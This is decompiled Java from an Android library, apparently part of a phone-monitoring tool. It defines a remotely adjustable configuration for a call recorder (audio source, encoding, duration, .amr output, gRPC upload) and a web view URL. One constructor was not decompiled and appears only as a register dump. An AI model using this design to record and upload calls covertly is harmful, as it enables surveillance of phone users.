package com.hawkshaw.library.datalayer.models;

import B3.f;
import D3.b;
import E3.q0;
import Y1.K;
import com.hawkshaw.library.datalayer.models.Command;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import p3.q;

@f
public final class DynamicConfig {
    public static final Companion Companion = new Companion((j3.f) null);
    private final CallRecorder callRecorder;
    private final String webViewUrl;

    @f
    public static final class CallRecorder {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {null, null, null, null, null, null, null, Command.FileRequest.Medium.Companion.serializer()};
        public static final Companion Companion = new Companion((j3.f) null);
        private final int audioEncoder;
        private final int audioEncodingBitRate;
        private final int audioSamplingRate;
        private final int audioSource;
        private final Command.FileRequest.Medium fileUploadMedium;
        private final int maxDurationMs;
        private final String outputFileExtension;
        private final int outputFormat;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return DynamicConfig$CallRecorder$$serializer.INSTANCE;
            }
        }

        public CallRecorder() {
            this(0, 0, 0, 0, 0, 0, (String) null, (Command.FileRequest.Medium) null, 255, (j3.f) null);
        }

        public static /* synthetic */ void getAudioEncoder$annotations() {
        }

        public static /* synthetic */ void getAudioEncodingBitRate$annotations() {
        }

        public static /* synthetic */ void getAudioSamplingRate$annotations() {
        }

        public static /* synthetic */ void getAudioSource$annotations() {
        }

        public static /* synthetic */ void getFileUploadMedium$annotations() {
        }

        public static /* synthetic */ void getMaxDurationMs$annotations() {
        }

        public static /* synthetic */ void getOutputFileExtension$annotations() {
        }

        public static /* synthetic */ void getOutputFormat$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(CallRecorder callRecorder, b bVar, SerialDescriptor serialDescriptor) {
            KSerializer[] kSerializerArr = $childSerializers;
            if (bVar.q(serialDescriptor) || callRecorder.audioSource != 6) {
                ((q) bVar).c0(0, callRecorder.audioSource, serialDescriptor);
            }
            if (bVar.q(serialDescriptor) || callRecorder.outputFormat != 3) {
                ((q) bVar).c0(1, callRecorder.outputFormat, serialDescriptor);
            }
            if (bVar.q(serialDescriptor) || callRecorder.audioEncoder != 1) {
                ((q) bVar).c0(2, callRecorder.audioEncoder, serialDescriptor);
            }
            if (bVar.q(serialDescriptor) || callRecorder.audioEncodingBitRate != 64000) {
                ((q) bVar).c0(3, callRecorder.audioEncodingBitRate, serialDescriptor);
            }
            if (bVar.q(serialDescriptor) || callRecorder.audioSamplingRate != 64000) {
                ((q) bVar).c0(4, callRecorder.audioSamplingRate, serialDescriptor);
            }
            if (bVar.q(serialDescriptor) || callRecorder.maxDurationMs != 600000) {
                ((q) bVar).c0(5, callRecorder.maxDurationMs, serialDescriptor);
            }
            if (bVar.q(serialDescriptor) || !K.f(callRecorder.outputFileExtension, ".amr")) {
                ((q) bVar).f0(serialDescriptor, 6, callRecorder.outputFileExtension);
            }
            if (bVar.q(serialDescriptor) || callRecorder.fileUploadMedium != Command.FileRequest.Medium.Grpc) {
                ((q) bVar).e0(serialDescriptor, 7, kSerializerArr[7], callRecorder.fileUploadMedium);
            }
        }

        public final int getAudioEncoder() {
            return this.audioEncoder;
        }

        public final int getAudioEncodingBitRate() {
            return this.audioEncodingBitRate;
        }

        public final int getAudioSamplingRate() {
            return this.audioSamplingRate;
        }

        public final int getAudioSource() {
            return this.audioSource;
        }

        public final Command.FileRequest.Medium getFileUploadMedium() {
            return this.fileUploadMedium;
        }

        public final int getMaxDurationMs() {
            return this.maxDurationMs;
        }

        public final String getOutputFileExtension() {
            return this.outputFileExtension;
        }

        public final int getOutputFormat() {
            return this.outputFormat;
        }

        /* JADX WARNING: Illegal instructions before constructor call */
        /* Code decompiled incorrectly, please refer to instructions dump. */
        public /* synthetic */ CallRecorder(int r9, int r10, int r11, int r12, int r13, int r14, java.lang.String r15, com.hawkshaw.library.datalayer.models.Command.FileRequest.Medium r16, int r17, j3.f r18) {
            /*
                r8 = this;
                r0 = r17
                r1 = r0 & 1
                if (r1 == 0) goto L_0x0008
                r1 = 6
                goto L_0x0009
            L_0x0008:
                r1 = r9
            L_0x0009:
                r2 = r0 & 2
                if (r2 == 0) goto L_0x000f
                r2 = 3
                goto L_0x0010
            L_0x000f:
                r2 = r10
            L_0x0010:
                r3 = r0 & 4
                if (r3 == 0) goto L_0x0016
                r3 = 1
                goto L_0x0017
            L_0x0016:
                r3 = r11
            L_0x0017:
                r4 = r0 & 8
                r5 = 64000(0xfa00, float:8.9683E-41)
                if (r4 == 0) goto L_0x0020
                r4 = r5
                goto L_0x0021
            L_0x0020:
                r4 = r12
            L_0x0021:
                r6 = r0 & 16
                if (r6 == 0) goto L_0x0026
                goto L_0x0027
            L_0x0026:
                r5 = r13
            L_0x0027:
                r6 = r0 & 32
                if (r6 == 0) goto L_0x002f
                r6 = 600000(0x927c0, float:8.40779E-40)
                goto L_0x0030
            L_0x002f:
                r6 = r14
            L_0x0030:
                r7 = r0 & 64
                if (r7 == 0) goto L_0x0037
                java.lang.String r7 = ".amr"
                goto L_0x0038
            L_0x0037:
                r7 = r15
            L_0x0038:
                r0 = r0 & 128(0x80, float:1.8E-43)
                if (r0 == 0) goto L_0x003f
                com.hawkshaw.library.datalayer.models.Command$FileRequest$Medium r0 = com.hawkshaw.library.datalayer.models.Command.FileRequest.Medium.Grpc
                goto L_0x0041
            L_0x003f:
                r0 = r16
            L_0x0041:
                r9 = r8
                r10 = r1
                r11 = r2
                r12 = r3
                r13 = r4
                r14 = r5
                r15 = r6
                r16 = r7
                r17 = r0
                r9.<init>(r10, r11, r12, r13, r14, r15, r16, r17)
                return
            */
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.DynamicConfig.CallRecorder.<init>(int, int, int, int, int, int, java.lang.String, com.hawkshaw.library.datalayer.models.Command$FileRequest$Medium, int, j3.f):void");
        }

        public /* synthetic */ CallRecorder(int i5, int i6, int i7, int i8, int i9, int i10, int i11, String str, Command.FileRequest.Medium medium, q0 q0Var) {
            this.audioSource = (i5 & 1) == 0 ? 6 : i6;
            if ((i5 & 2) == 0) {
                this.outputFormat = 3;
            } else {
                this.outputFormat = i7;
            }
            if ((i5 & 4) == 0) {
                this.audioEncoder = 1;
            } else {
                this.audioEncoder = i8;
            }
            if ((i5 & 8) == 0) {
                this.audioEncodingBitRate = 64000;
            } else {
                this.audioEncodingBitRate = i9;
            }
            if ((i5 & 16) == 0) {
                this.audioSamplingRate = 64000;
            } else {
                this.audioSamplingRate = i10;
            }
            if ((i5 & 32) == 0) {
                this.maxDurationMs = 600000;
            } else {
                this.maxDurationMs = i11;
            }
            if ((i5 & 64) == 0) {
                this.outputFileExtension = ".amr";
            } else {
                this.outputFileExtension = str;
            }
            if ((i5 & 128) == 0) {
                this.fileUploadMedium = Command.FileRequest.Medium.Grpc;
            } else {
                this.fileUploadMedium = medium;
            }
        }

        public CallRecorder(int i5, int i6, int i7, int i8, int i9, int i10, String str, Command.FileRequest.Medium medium) {
            K.n(str, "outputFileExtension");
            K.n(medium, "fileUploadMedium");
            this.audioSource = i5;
            this.outputFormat = i6;
            this.audioEncoder = i7;
            this.audioEncodingBitRate = i8;
            this.audioSamplingRate = i9;
            this.maxDurationMs = i10;
            this.outputFileExtension = str;
            this.fileUploadMedium = medium;
        }
    }

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(j3.f fVar) {
            this();
        }

        public final KSerializer serializer() {
            return DynamicConfig$$serializer.INSTANCE;
        }
    }

    public DynamicConfig() {
        this((CallRecorder) null, (String) null, 3, (j3.f) null);
    }

    public static /* synthetic */ void getCallRecorder$annotations() {
    }

    public static /* synthetic */ void getWebViewUrl$annotations() {
    }

    public static final /* synthetic */ void write$Self$library_release(DynamicConfig dynamicConfig, b bVar, SerialDescriptor serialDescriptor) {
        if (bVar.q(serialDescriptor) || !K.f(dynamicConfig.callRecorder, new CallRecorder(0, 0, 0, 0, 0, 0, (String) null, (Command.FileRequest.Medium) null, 255, (j3.f) null))) {
            ((q) bVar).e0(serialDescriptor, 0, DynamicConfig$CallRecorder$$serializer.INSTANCE, dynamicConfig.callRecorder);
        }
        if (bVar.q(serialDescriptor) || !K.f(dynamicConfig.webViewUrl, "file:///android_asset/index.html")) {
            ((q) bVar).f0(serialDescriptor, 1, dynamicConfig.webViewUrl);
        }
    }

    public final CallRecorder getCallRecorder() {
        return this.callRecorder;
    }

    public final String getWebViewUrl() {
        return this.webViewUrl;
    }

    /* JADX INFO: this call moved to the top of the method (can break code semantics) */
    public /* synthetic */ DynamicConfig(CallRecorder callRecorder2, String str, int i5, j3.f fVar) {
        this((i5 & 1) != 0 ? new CallRecorder(0, 0, 0, 0, 0, 0, (String) null, (Command.FileRequest.Medium) null, 255, (j3.f) null) : callRecorder2, (i5 & 2) != 0 ? "file:///android_asset/index.html" : str);
    }

    public /* synthetic */ DynamicConfig(int i5, CallRecorder callRecorder2, String str, q0 q0Var) {
        this.callRecorder = (i5 & 1) == 0 ? new CallRecorder(0, 0, 0, 0, 0, 0, (String) null, (Command.FileRequest.Medium) null, 255, (j3.f) null) : callRecorder2;
        if ((i5 & 2) == 0) {
            this.webViewUrl = "file:///android_asset/index.html";
        } else {
            this.webViewUrl = str;
        }
    }

    public DynamicConfig(CallRecorder callRecorder2, String str) {
        K.n(callRecorder2, "callRecorder");
        K.n(str, "webViewUrl");
        this.callRecorder = callRecorder2;
        this.webViewUrl = str;
    }
}
